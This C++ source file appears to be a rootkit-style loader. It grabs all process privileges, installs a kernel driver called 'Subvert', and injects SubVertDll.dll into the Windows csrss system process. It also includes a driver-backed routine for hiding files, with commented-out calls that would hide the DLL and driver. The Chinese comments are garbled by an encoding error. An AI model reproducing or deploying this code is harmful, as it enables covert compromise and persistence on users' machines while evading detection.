// inject_tool.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "../Common/common.h"
#include "../Common/native_class.h"
#include "../Common/native_inject.h"
#include "../Common/ioctrl.h"
#include "subvert_sys.h"

void hide_file(const wchar_t *filename)
{
	const auto handle = std::experimental::make_unique_resource(
		CreateFile(TEXT("\\\\.\\Subvert"), GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
			nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr),
		&CloseHandle);

	HIDE_FILE hide = { 0 };
	wcscpy(hide.filename, filename);
	auto returned = DWORD(0);
	auto bRet = DeviceIoControl(handle.get(), DRV_IOCTL_HIDE_FILE, &hide, sizeof(hide), NULL, 0,
		&returned, nullptr);
}
void load_drv()
{
	__try
	{
		install::install_drv();
	}
	__except (1)
	{
		DBG_PRINTA("�������ع���ʧ��\r\n");
	}
}
int main()
{
	native::get_all_privilege();
#if 0
	//ע��ֻ����һ�εİ���
	ATOM hAtom;
	LPCTSTR lpszAtomName = TEXT("Global-Event-000000050systemevent");//��Ϥ��ζ��
	if ((hAtom = GlobalFindAtom(lpszAtomName)))
	{
		ExitProcess(-1);
	}
	hAtom = GlobalAddAtom(lpszAtomName);
#endif

	load_drv();

	auto csrss_pid = CsrGetProcessId();
	if (csrss_pid)
	{
		DBG_PRINT(_T("csrss pid = %llu\r\n"), (DWORD_PTR)csrss_pid);
		native::inject::getInstance().inject_dll_ex((DWORD)csrss_pid, L"\\SubVertDll.dll");
	}
	else
	{
		DBG_PRINT(_T("Find CSRSS Failed\r\n"));
	}

	//https://github.com/JKornev/hidden hidden�Ĵ����ַ
	//https://github.com/DarthTon/Blackbone blackbone�Ĵ����ַ

	//hide_file(L"*SUBVERTDLL.DLL");//DLL����
	//hide_file(L"*SBVT*.SYS");//�����ļ�����

    return 0;

}

